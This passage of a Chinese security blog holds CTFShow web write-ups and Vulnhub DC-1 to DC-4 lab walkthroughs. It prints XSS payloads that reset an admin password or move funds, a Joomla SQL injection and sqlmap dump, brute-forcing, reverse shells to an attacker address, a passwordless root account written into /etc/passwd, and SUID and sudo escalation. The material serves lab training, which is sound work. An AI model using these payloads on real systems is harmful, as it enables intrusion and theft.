title="Web330"></a>Web330</h2><p>后台管理员有功能页面，能够查看注册用户的账号密码<br>其中有一个修改的密码，通过访问一个地址即可修改密码（抓包分析，需用户登录状态）<br>思路：注册一个用户名和密码存在跳转修改密码的URL地址连接<br>如果管理员登录了后台，然后查看了用户的注册密码信息，就可以尝试重置密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>管理员密码成功改为123 </p><h2 id="Web331"><a href="#Web331" class="headerlink" title="Web331"></a>Web331</h2><p>思路同上，修改密码的方式由GET改为了POST</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web332"><a href="#Web332" class="headerlink" title="Web332"></a>Web332</h2><p>发现flag需要9999</p><p>有一个转账功能</p><p>随便注册一个号然后转账负数</p><h2 id="Web333"><a href="#Web333" class="headerlink" title="Web333"></a>Web333</h2><p>利用xss让管理员给我们转账</p><p>抓包分析转账参数 u为用户名 a为转账金额 post提交</p><p>先注册一个123账号用来收钱</p><p>然后注册带xss语句的用户</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;123&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非预期解<br>自己给自己转账，指数增长，不能超过当前余额</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-4靶机渗透记录</title>
      <link href="/posts/bacc01ec/"/>
      <url>/posts/bacc01ec/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-4打靶记录"><a href="#Vulnhub-DC-4打靶记录" class="headerlink" title="Vulnhub DC-4打靶记录"></a>Vulnhub DC-4打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p>发现目标192.168.168.153扫下端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.153 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220707175229860.png" alt="image-20220707175229860"></p><p>只有一个80端口</p><p><img src="/posts/bacc01ec/image-20220707175340019.png" alt="image-20220707175340019"></p><p>一个管理员登录界面 看下能不能注入</p><p><img src="/posts/bacc01ec/image-20220707175904576.png" alt="image-20220707175904576"></p><p>看来不行</p><p>目录扫描也没有结果</p><p>试下爆破管理员密码</p><p>用burp爆破出来密码为happy</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>登录到后台</p><p>发现可以执行命令</p><p><img src="/posts/bacc01ec/image-20220707194145456.png" alt="image-20220707194145456"></p><p>抓包看下参数</p><p><img src="/posts/bacc01ec/image-20220707194257511.png" alt="image-20220707194257511"></p><p>把radio参数改为反弹shell命令空格用+代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+-e+/bin/bash+192.168.168.129+4444</span><br></pre></td></tr></table></figure><p>记得kali要先监听4444端口</p><p><img src="/posts/bacc01ec/image-20220707195334495.png" alt="image-20220707195334495"></p><p>权限很低没有写权限只能读文件 看下敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc/passwd</span><br></pre></td></tr></table></figure><p>看到三个用户charles，jim，sam</p><p><img src="/posts/bacc01ec/image-20220708224335646.png" alt="image-20220708224335646"></p><p>在jim的home目录下看到一个备份文件</p><p><img src="/posts/bacc01ec/image-20220708224610677.png" alt="image-20220708224610677"></p><p>应该是备份密码 把里面内容copy到pass.txt</p><p>该ip开放有22端口 可以ssh爆破用hydra 再新建一个user.txt 内容就是那三个用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 192.168.168.153 ssh</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220708225906866.png" alt="image-20220708225906866"></p><p>成功爆破出jim的ssh密码</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用Xshell连接靶机ssh</p><p>翻一下文件 再home目录下发现一个测试邮件</p><p><code>var/mail</code>下发现一个邮件</p><p>发现charles的密码</p><p><img src="/posts/bacc01ec/image-20220709183018101.png" alt="image-20220709183018101"></p><p>换到charles用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>看下可以执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709183558427.png" alt="image-20220709183558427"></p><p>可以执行teehee命令（teehee命令可以写入文件内容并不覆盖文件原有内容）</p><p>可以利用teehee进行提权，用teehee把一个无密码用户写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;fatty::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;etc&#x2F;passwd </p><p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p><p>用户名，就是一串代表用户身份的字符串。</p><p>UID:也就是用户 ID（<code>0</code>超级用户，<code>1~499</code>系统用户（伪用户）<code>500~65535</code> 普通用户）</p><p>GID:全称“Group ID”，简称“组ID”，表示用户初始组的组 ID 号</p></blockquote><p>切换到fatty用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su fatty</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184644368.png" alt="image-20220709184644368"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/bacc01ec/image-20220709184757317.png" alt="image-20220709184757317"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-3靶机渗透记录</title>
      <link href="/posts/f0f28aa7/"/>
      <url>/posts/f0f28aa7/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-3打靶记录"><a href="#Vulnhub-DC-3打靶记录" class="headerlink" title="Vulnhub DC-3打靶记录"></a>Vulnhub DC-3打靶记录</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224526760.png" alt="image-20220601224526760"></p><p>发现一个目标 扫描端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.146 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601224606759.png" alt="image-20220601224606759"></p><p>只有一个80端口</p><p>使用wappalyzer发现cms: Joomla</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>百度下joomla的历史漏洞，发现存在sql注入漏洞</p><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601225344829.png" alt="image-20220601225344829"></p><p>确实存在sql注入漏洞可以利用</p><p>直接sqlmap开跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601230403567.png" alt="image-20220601230403567"></p><p>看看能不能拿到数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.168.146/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&quot; -D joomladb -T &quot;#__users&quot; -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220601231045796.png" alt="image-20220601231045796"></p><p>拿到admin用户密码的hash值</p><p><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p><p>利用john进行爆破</p><p>新建一个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim admin-hash</span><br></pre></td></tr></table></figure><p>把获取到的hash值填进去</p><p>john爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john admin-hash </span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220702225157861.png" alt="image-20220702225157861"></p><p>得到密码<code>snoopy</code></p><p>御剑扫描发现一个<a href="http://192.168.168.146/administrator/">http://192.168.168.146/administrator/</a></p><p>登录到后台</p><p>发现文件上传漏洞</p><p><img src="/posts/f0f28aa7/image-20220702225815839.png" alt="image-20220702225815839"></p><p><img src="/posts/f0f28aa7/image-20220705221027682.png" alt="image-20220705221027682"></p><p>进去新建一个shell.php</p><p>蚁剑连接url为:<a href="http://192.168.168.146/templates/beez3/shell.php">http://192.168.168.146/templates/beez3/shell.php</a></p><p><img src="/posts/f0f28aa7/image-20220705221131144.png" alt="image-20220705221131144"></p><p>为web权限</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用searchsploit查找Ubuntu 16.04可以利用的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220705221540008.png" alt="image-20220705221540008"></p><p>存在内核提权</p><p>查看利用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p>发现下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip </span><br></pre></td></tr></table></figure><p>解压文件</p><p>利用蚁剑上传exp</p><p><img src="/posts/f0f28aa7/image-20220706102455223.png" alt="image-20220706102455223"></p><p>反弹shell</p><p>在刚才的shell.php中写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.168.129 4444 &gt;/tmp/f&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>监听4444端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="/posts/f0f28aa7/image-20220706104510795.png" alt="image-20220706104510795"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-2靶机渗透记录</title>
      <link href="/posts/27100aff/"/>
      <url>/posts/27100aff/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-DC-2"><a href="#Vulnhub-DC-2" class="headerlink" title="Vulnhub DC-2"></a>Vulnhub DC-2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描资产</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092019810.png" alt="image-20220515092019810"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -p- -T4 192.168.168.143</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515092955208.png" alt="image-20220515092955208"></p><p>发现80端口存在 <code>Did not follow redirect to http://dc-2/</code> 也就是dns服务器无法重定向到<a href="http://dc-2/">http://dc-2/</a> 所以直接使用ip地址访问是无法成功的</p><p>所以要更改host文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p>windows下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p>添加一个192.168.168.143 dc-2</p><p><img src="/posts/27100aff/image-20220515094005916.png" alt="image-20220515094005916"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>更改完成后即可访问在主界面即可找到flag1</p><p><img src="/posts/27100aff/image-20220515094515186.png" alt="image-20220515094515186"></p><p>大概意思就是使用cewl生成密码字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pwd.txt </span><br></pre></td></tr></table></figure><p>在网站底部发现是wordpress建的</p><p>使用wpscan 枚举账户</p><p>api可以到<a href="https://wpvulndb.com/users/sign_up">https://wpvulndb.com/users/sign_up</a> 注册获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u --api-token xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>接下密码爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ user.txt -P /root/桌面/pwd.txt --api-token xxxxx</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515101623014.png" alt="image-20220515101623014"></p><p>接下来进入后台</p><p>wordpress的后台地址为:&#x2F;wp-admin</p><p>使用jerry账户登录发现flag2</p><p><img src="/posts/27100aff/image-20220515103444441.png" alt="image-20220515103444441"></p><p>大概意思是让我们另一个突破口</p><p>利用前面找到的ssh</p><p>使用tom账号成功登录</p><p>目录下存在flag3.txt</p><p>但是很多查看命令都看不了使用vi查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag.txt</span><br></pre></td></tr></table></figure><p>意思是让我们换成jerry用户</p><p>但tom使用rbash权限非常小 要想办法绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a # 把bin/sh给变量a</span><br><span class="line">export PATH=$PATH:/bin/ # 将/bin 作为PATH环境变量导出</span><br></pre></td></tr></table></figure><p>其他绕过方法：<a href="https://www.freebuf.com/articles/system/188989.html">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></p><p>切换到Jerry</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">cd /home/jerry</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515105352487.png" alt="image-20220515105352487"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>老样子还是uid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111029686.png" alt="image-20220515111029686"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515111228910.png" alt="image-20220515111228910"></p><p>发现git为root权限执行</p><p>注意执行命令前先把终端变窄不然会报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help ifconfig</span><br></pre></td></tr></table></figure><p>在末尾输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat cat final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/27100aff/image-20220515112312605.png" alt="image-20220515112312605"></p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub DC-1靶机渗透记录</title>
      <link href="/posts/84468c56/"/>
      <url>/posts/84468c56/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub-DC-1"><a href="#vulnhub-DC-1" class="headerlink" title="vulnhub DC-1"></a>vulnhub DC-1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212318465.png" alt="image-20220513212318465"></p><p>发现目标</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>目标开放80端口，访问</p><p>网站底部发现cms信息</p><p><img src="/posts/84468c56/image-20220513211257084.png" alt="image-20220513211257084"></p><p>利用msf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line">show options</span><br><span class="line">setRHOST 192.168.168.142</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212247156.png" alt="image-20220513212247156"></p><p>成功拿到会话</p><p>看下目录下都有什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212514963.png" alt="image-20220513212514963"></p><p>看一下flag1.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513212550669.png" alt="image-20220513212550669"></p><p>意思是每个cms都有一个配置文件让我们找到他</p><p>翻了半天在&#x2F;var&#x2F;www&#x2F;sites&#x2F;default下找到了一个settings.php</p><p>打开发现了数据库账号密码以及flag2</p><p><img src="/posts/84468c56/image-20220513213324393.png" alt="image-20220513213324393"></p><p><img src="/posts/84468c56/image-20220513213439596.png" alt="image-20220513213439596"></p><p><img src="/posts/84468c56/image-20220513213513210.png" alt="image-20220513213513210"></p><p>进入到shell连接mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #完整的shell环境</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513220411683.png" alt="image-20220513220411683"></p><p>pass进行了加密</p><p>百度发现drupalCMS使用的是 &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh对密码进行加密的</p><p>同时我们也可以利用这个文件 自行机密一个密码然后替换掉原来的密码</p><p>到scripts进行调用发现不能用 到www目录下可以调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p>得到新密码的加密值</p><p><img src="/posts/84468c56/image-20220513221916364.png" alt="image-20220513221916364"></p><p>到mysql中把admin密码改成新密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DaAOPXcKfpHXmrZY07Ro0GS9X7JpEnIyQxOpJK3pHnnB3Ii/FR.T&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><p>进入到后台登录</p><p><img src="/posts/84468c56/image-20220513223201939.png" alt="image-20220513223201939"></p><p><img src="/posts/84468c56/image-20220513223215081.png" alt="image-20220513223215081"></p><p>发现flag3</p><p><img src="/posts/84468c56/image-20220513223236120.png" alt="image-20220513223236120"></p><p>在shell中全局搜索flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;flag*&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513223705776.png" alt="image-20220513223705776"></p><p>接下来就该提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用msf上传探针脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/桌面/LinEnum/LinEnum.sh /tmp/</span><br></pre></td></tr></table></figure><p>进入shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p>利用suid提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225105361.png" alt="image-20220513225105361"></p><p>find可以用来提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch shell</span><br><span class="line">find shell -exec whoami \;</span><br><span class="line">find shell -exec netcat -lvp 5555 -e /bin/sh \; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新起一个终端</span></span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure><p><img src="/posts/84468c56/image-20220513225920195.png" alt="image-20220513225920195"></p><p>完成</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_文件上传</title>
      <link href="/posts/fdac7c8/"/>
      <url>/posts/fdac7c8/</url>
      
        <content type="html"><![CDATA[<h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><p>前端验证只能上传png文件</p><p>方法一：关闭浏览器的js</p><p>方法二：</p><p>把一句话文件改为png后缀然后bp抓包改回php</p><p><img src="/posts/fdac7c8/image-20220403153443766.png" alt="image-20220403153443766"></p><p>文件上传在upload&#x2F;1.php</p><p>蚁剑连接flag在上级目录</p><h2 id="Web152"><a href="#Web152" class="headerlink" title="Web152"></a>Web152</h2><p>同web151的方法二</p><h2 id="Web153"><a href="#Web153" class="headerlink" title="Web153"></a>Web153</h2><p>利用.user.ini文件进行绕过</p><p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p><blockquote><p>官方文档:<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p><img src="/posts/fdac7c8/image-20220403203936524-165898386339940.png" alt="image-20220403203936524"></p><p>由上图可知PHP_INI_USER模式就是.user.ini</p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini</p><p>只有在当前目录下有php文件才可以使用</p><p>.user.ini的配置参数和php.ini相同</p><p>具体配置参数:<a href="https://www.php.net/manual/en/ini.list.php">https://www.php.net/manual/en/ini.list.php</a></p></blockquote><p>这里利用 auto_append_file 参数 作用是包含一个文件</p><p>首先要先上传一个.user.ini文件</p><p>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=<span class="string">&quot;1.txt&quot;</span> <span class="comment"># &quot;&quot;内为要上传的文件名字 注意不要是php后缀</span></span><br></pre></td></tr></table></figure><p>要绕过前端验证,先把后缀改为png然后抓包改为.user.ini</p><p><img src="/posts/fdac7c8/image-20220403214327526.png" alt="image-20220403214327526"></p><p>然后上传1.txt文件 内容为一句话</p><p>上传成功后蚁剑连接注意地址为<code>xxxx/upload</code>不是1.txt</p><h2 id="Web154"><a href="#Web154" class="headerlink" title="Web154"></a>Web154</h2><p>先上传上一题的.user.ini试下</p><p><img src="/posts/fdac7c8/image-20220412161942647.png" alt="image-20220412161942647"></p><p>继续上传1.txt</p><p><img src="/posts/fdac7c8/image-20220412162122727.png" alt="image-20220412162122727"></p><p><img src="/posts/fdac7c8/image-20220412162147450.png" alt="image-20220412162147450"></p><p>这里对文件内容进行了检查</p><p>经过测试是对php进行了过滤</p><p>利用短标签进行绕过</p><blockquote><p>短标记是用来输出变量或表达式，一般用法是<br><code>&lt;?=$a?&gt;</code><br><code>&lt;?=(表达式)?&gt;</code><br>就相当于<br><code>&lt;?php echo $a?&gt;`` ``&lt;?php echo 